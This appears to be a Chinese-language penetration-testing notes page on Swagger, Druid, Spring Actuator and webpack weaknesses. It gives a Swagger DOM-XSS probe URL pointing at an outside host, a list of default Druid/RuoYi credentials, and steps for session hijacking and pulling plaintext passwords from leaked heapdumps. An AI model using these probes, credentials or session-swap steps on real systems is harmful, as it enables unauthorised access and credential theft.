---
title: swagger，druid，actuator，webpack
date: 2026-06-09
categories:
  - web服务器+中间件漏洞总结
tags: []
---

# swagger

## swagger未授权访问

swagger默认开启了接口文档，如果项目上线的时候没有关闭这个文档，可以造成接口泄露，

### 发现：

直接使用springbootscan直接扫，看看有没有就可以了

### 深入渗透：

在接口文档中直接看看有没有未授权接口，可以直接使用swagger-hacker工具快速的过一遍接口文档，看看有没有未授权接口，在跑的时候，用api-docx来跑，使用html页面容易跑不出来

## swagger的dom型xss

找到ui界面，低版本可以触发一个xss，检测直接在后面加上

```Plain Text
?configUrl=https://xss.smarpo.com/test.json
```

如果弹窗了，就证明有这个dom型xss

# druid

## druid未授权与弱密码

根据springboot的扫描结果，直接看看有没有的druid的界面，然后访问看看就可以了，如果直接进到了druid的界面，那么就是druid的未授权，如果是一个登录界面，那么可以直接试一试弱密码，去看看对应的框架的弱密码就可以了

```Plain Text
ruoyi 123456
ry 123456
dy admin123
admin admin
admin 123456
admin admin123
```

## 深入渗透：

### url监控

如果发现了弱口令，景区可druid的界面，那么可以查看一下页面中的url监控，尝试拼接访问

### session监控

点击session监控，替换掉自己的session，看看可以不可以访问需要认证的接口，有些时候可能需要一些前端的路径才可以使用

# Actuator

依旧进行目录扫描，如果有的话直接就可以扫出来，当然要带上baseurl

如果泄露了heapdump，env，trace，可以尝试深入利用

## 利用工具解析heapdump

如果泄露了heapdump和env，可以直接使用工具查出env中的明文密码，根据地址来登录就可以了

# webpack

webpack是一个JavaScript应用程序的静态资源打包器（module bundler）。它会递归构建一个依赖关系图（dependency graph）,其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个bundle。大部分Vue等项目应用会使用webpack进行打包，如果没有正确配置，就会导致项目源码泄露，可能泄露的各种信息如API、加密算法、管理员邮箱、内部功能等等。

## 漏洞检测

如果有源码泄露，

1. 可以直接在浏览器查看源码中看到源码， 在Sources-Page-webpack://中

2. webpack会在网站的js目录下生成一个js.map文件，可以直接在js的url目录下面添加.map就可以下载源码了



